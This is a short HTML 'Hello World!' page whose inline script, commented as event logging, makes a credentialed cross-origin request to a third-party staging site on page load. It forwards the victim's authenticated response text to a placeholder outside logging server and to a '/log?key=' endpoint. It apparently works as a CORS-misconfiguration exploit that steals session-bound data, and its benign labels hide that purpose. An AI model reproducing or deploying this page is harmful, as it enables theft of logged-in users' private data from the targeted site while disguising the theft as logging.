<!DOCTYPE html>
<html>
  <body>
    <h1>Hello World!</h1>
    <script>
      // Function to log events to the remote logging server
      function logEvent(eventType, details) {
        fetch('https://your-logging-server.com/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ eventType, details, timestamp: new Date().toISOString() })
        }).catch(error => console.error('Logging error:', error));
      }

      // Example usage to log button click events
      logEvent('page_load', { message: 'Page loaded successfully.' });

      // Creating an XMLHttpRequest to fetch data from a URL
      var xhr = new XMLHttpRequest();
      var url = "https://stage.tam.ch/";

      xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          // Log the response from the request using the logEvent function
          logEvent('xhr_response', { responseText: xhr.responseText });
          
          // Making a request to a log endpoint (this is an additional example)
          fetch("/log?key=" + xhr.responseText);
        }
      }

      xhr.open('GET', url, true);
      xhr.withCredentials = true;
      xhr.send(null);
    </script>
  </body>
</html>
